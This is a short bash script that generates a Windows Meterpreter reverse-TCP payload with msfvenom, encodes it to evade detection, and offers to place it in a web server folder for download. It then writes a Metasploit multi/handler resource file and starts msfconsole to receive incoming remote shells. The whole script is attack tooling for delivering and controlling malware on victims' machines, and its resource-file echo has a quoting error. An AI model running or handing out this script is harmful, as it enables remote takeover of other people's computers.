#!/bin/bash

clear

#echo -n "enter your ip address:"
read ip
#echo -n "Enter the desired  port: "
read port
#echo -n "Enter your malicious executable's name : "
read name

#echo "Generating payload.... "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $name.exe

check=($(ls | grep $name.exe))


#echo "Payload Generated "
echo "Here is your Exe :" $check
read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo "Copying payload to /var/www/html "
        cp $name.exe /var/www/html/
        echo "Copied "
        echo ":download your payload from 192.168.172.133:8000"
        echo "use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST" ""$ip"
set LPORT" ""$port"
set ExitOnSession false
exploit -j -z" | tee listenerw.rc


echo "Now Starting Msf multi/handler for the above !"
msfconsole -r listenerw.rc
         

else
    echo "Okey ! Tc"
fi
